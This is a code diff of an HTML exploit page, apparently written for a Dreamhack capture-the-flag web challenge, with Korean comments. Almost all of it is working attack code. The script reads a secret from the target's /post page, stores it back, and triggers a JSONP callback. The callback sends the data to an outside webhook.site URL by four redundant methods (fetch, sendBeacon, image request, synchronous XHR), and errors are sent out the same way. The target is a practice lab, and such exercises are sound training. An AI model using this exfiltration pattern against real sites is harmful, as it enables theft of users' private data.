@@ -1,39 +1,81 @@
+<!DOCTYPE html>
 <html>
 <body>
+<h1>Loading...</h1>
 <script>
-// Step 1: /post 페이지에서 FLAG 추출
-fetch('http://host8.dreamhack.games:9182/post')
-  .then(r => r.text())
-  .then(html => {
-    // HTML 파싱하여 input value에서 FLAG 추출
-    let parser = new DOMParser();
-    let doc = parser.parseFromString(html, 'text/html');
-    let flag = doc.querySelector('#info_value').value;
+const WEBHOOK = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';
+
+async function exploit() {
+  try {
+    // Step 1: GET /post
+    console.log('[1] Fetching /post...');
+    const resp = await fetch('http://host8.dreamhack.games:9182/post');
+    const html = await resp.text();
     
-    // Step 2: POST 요청으로 info_value에 FLAG 저장
-    let formData = new FormData();
+    // Extract FLAG
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    const flag = doc.querySelector('#info_value').value;
+    console.log('[2] FLAG:', flag);
+    
+    // Step 2: POST to save FLAG in info_value
+    console.log('[3] Saving to info_value...');
+    const formData = new FormData();
     formData.append('info_value', flag);
     
-    return fetch('http://host8.dreamhack.games:9182/post', {
+    await fetch('http://host8.dreamhack.games:9182/post', {
       method: 'POST',
       body: formData
     });
-  })
-  .then(() => {
-    // Step 3: JSONP callback으로 FLAG 유출
+    
+    console.log('[4] Saved! Waiting...');
+    await new Promise(resolve => setTimeout(resolve, 1500));
+    
+    // Step 3: JSONP callback
+    console.log('[5] Loading JSONP...');
     window.exfiltrate = function(data) {
-      // 외부 서버로 전송 (여기서는 Dreamhack webhook 사용)
-      fetch('https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1/?flag=' + encodeURIComponent(data.info));
+      console.log('[6] Callback triggered!', data);
       
-      // 또는 location.href로 직접 확인
-      location.href = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1/?flag=' + encodeURIComponent(data.info);
+      // 방법 1: fetch (promise로 완료 보장)
+      fetch(WEBHOOK + '?flag=' + encodeURIComponent(data.info))
+        .then(() => console.log('Fetch sent!'))
+        .catch(e => console.error('Fetch error:', e));
+      
+      // 방법 2: sendBeacon (가장 확실함)
+      if (navigator.sendBeacon) {
+        const sent = navigator.sendBeacon(WEBHOOK + '?beacon=' + encodeURIComponent(data.info));
+        console.log('Beacon sent:', sent);
+      }
+      
+      // 방법 3: Image (항상 작동)
+      const img = new Image();
+      img.onload = () => console.log('Image sent!');
+      img.onerror = () => console.log('Image error');
+      img.src = WEBHOOK + '?img=' + encodeURIComponent(data.info);
+      
+      // 방법 4: XHR 동기 요청 (마지막 수단)
+      try {
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', WEBHOOK + '?xhr=' + encodeURIComponent(data.info), false); // false = 동기
+        xhr.send();
+        console.log('XHR sent!');
+      } catch(e) {
+        console.error('XHR error:', e);
+      }
     };
     
-    // JSONP script 로드
-    let script = document.createElement('script');
+    const script = document.createElement('script');
     script.src = 'http://host8.dreamhack.games:9182/callback?callback=window.exfiltrate';
     document.body.appendChild(script);
-  });
+    
+  } catch(e) {
+    console.error('Error:', e);
+    // 에러도 전송
+    new Image().src = WEBHOOK + '?error=' + encodeURIComponent(e.message);
+  }
+}
+
+exploit();
 </script>
 </body>
 </html>
